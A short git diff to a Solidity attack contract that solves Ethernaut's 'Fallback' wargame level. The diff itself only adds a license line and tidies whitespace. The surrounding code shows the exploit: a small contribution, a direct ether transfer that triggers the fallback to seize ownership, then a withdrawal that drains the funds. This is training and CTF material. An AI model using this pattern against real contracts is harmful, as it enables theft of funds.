@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
 import {Fallback} from "ethernaut/01Fallback.sol";
@@ -12,7 +13,7 @@ contract AttackContract is Ownable {
 
     function exploit() public {
         instance.contribute{value: 1 wei}();
-        (bool success, ) = address(instance).call{value: 2 wei}("");
+        (bool success,) = address(instance).call{value: 2 wei}("");
         require(success, "Failed to transfer ether");
         instance.withdraw();
     }
